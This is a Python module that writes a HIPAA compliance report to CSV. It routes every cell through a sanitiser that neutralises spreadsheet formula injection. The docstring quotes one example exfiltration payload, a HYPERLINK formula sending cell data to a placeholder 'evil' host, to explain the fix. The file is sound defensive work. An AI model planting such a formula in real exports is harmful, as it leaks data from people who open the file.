"""HIPAA Basic Compliance Report v0.8.0: renders the same report context
pdf.py consumes into a single CSV -- one section per block, separated by
a blank row and a "## Section Name" marker row, the same shape a reader
opening this in a spreadsheet app or a plain text editor can both follow
without a header line lying about how many columns the rest of the file
has (Section 1 is a 2-column metric/value table; Sections 2-4 are wider).
No new csv-writing convention invented -- csv.writer + io.StringIO is the
exact mechanism analytics/router.py's own /analytics/export already uses.

Pre-merge security review finding (2026-08-12): every string field here
-- organization_name, user_label, actor_label, event label, generated_by
-- ultimately traces back to user-controlled input (an org name is a
free-text field any org member with create/rename permission can set;
Organization.name has no character-class validation in omnibioai-auth's
own schema). csv.writer performs no formula-injection sanitization on
its own, so a value like `=HYPERLINK("http://evil/?x="&A1)` written
verbatim would execute as a live formula for anyone who opens this
export in Excel/Sheets/LibreOffice -- the well-known CSV/Formula
Injection class (CWE-1236, OWASP). `_writerow` below is the one place
every row passes through, so every cell in every section is covered by
construction -- there is no code path in this module that can call
`writer.writerow` directly and skip it.
"""
from __future__ import annotations

import csv
import io
from typing import Any

# The four leading characters spreadsheet applications treat as "this
# cell is a formula" -- the standard set the OWASP CSV Injection cheat
# sheet and every major vendor mitigation (Google, Microsoft, GitHub)
# neutralize. A leading tab/CR is a secondary, much rarer vector some
# guidance also lists; not included here to keep the mitigation focused
# on the actual, demonstrated vector (org names), not a speculative one.
_FORMULA_PREFIXES = ("=", "+", "-", "@")


def _sanitize_cell(value: Any) -> Any:
    """Neutralizes formula injection: any cell whose string form starts
    with =, +, -, or @ gets a leading apostrophe, the standard Excel/
    Sheets/LibreOffice convention for "treat this as literal text, not a
    formula" -- the cell still displays the original value (spreadsheet
    apps hide the leading apostrophe), it just never executes.

    Non-string values (int/None) are returned unchanged -- a plain
    integer or None can never start with a formula-trigger character,
    and preserving the original type keeps numeric columns numeric
    rather than silently stringifying every cell in the file.
    """
    if not isinstance(value, str) or not value:
        return value
    if value[0] in _FORMULA_PREFIXES:
        return "'" + value
    return value


def _writerow(writer: Any, cells: list[Any]) -> None:
    writer.writerow([_sanitize_cell(c) for c in cells])


def render_report_csv(context: dict[str, Any]) -> str:
    buffer = io.StringIO()
    writer = csv.writer(buffer)

    _writerow(writer, ["HIPAA Basic Compliance Report"])
    _writerow(writer, ["Organization", f"{context['organization_name']} (org #{context['organization_id']})"])
    _writerow(writer, ["Period", f"{context['from_date']} to {context['to_date']}"])
    _writerow(writer, ["Generated", f"{context['generated_at']} by {context['generated_by']}"])

    sources_unavailable = context.get("sources_unavailable") or []
    if sources_unavailable:
        _writerow(writer, [])
        _writerow(writer, ["WARNING: one or more data sources were unavailable during report generation"])
        for source in sources_unavailable:
            _writerow(writer, ["Unavailable source", source])
    _writerow(writer, [])

    _writerow(writer, ["## Section 1: Executive Summary"])
    _writerow(writer, ["Metric", "Value"])
    summary = context["summary"]
    _writerow(writer, ["Total Users", summary["total_users"]])
    _writerow(writer, ["Active Users In Period", summary["active_users"]])
    _writerow(writer, ["RAG Queries", summary["total_rag_queries"]])
    _writerow(writer, ["Failed Login Attempts", summary["failed_login_attempts"]])
    _writerow(writer, ["Security Events Requiring Review", summary["security_events_requiring_review"]])
    _writerow(writer, [])

    _writerow(writer, ["## Section 2: User Access Log"])
    _writerow(writer, ["User", "Login Count", "Last Login", "Failed Attempts"])
    for row in context["user_access"]:
        _writerow(writer, [row["user_label"], row["login_count"], row["last_login"], row["failed_attempts"]])
    _writerow(writer, [])

    _writerow(writer, ["## Section 3: RAG Query Log"])
    _writerow(writer, ["Timestamp", "User", "Trace ID"])
    for row in context["rag_queries"]:
        _writerow(writer, [row["timestamp"], row["user_label"], row["trace_id"] or ""])
    _writerow(writer, [])

    _writerow(writer, ["## Section 4: Security Events"])
    _writerow(writer, ["Timestamp", "Event", "Actor", "Outcome"])
    for row in context["security_events"]:
        _writerow(writer, [row["timestamp"], row["label"], row["actor_label"], row["outcome"]])

    return buffer.getvalue()
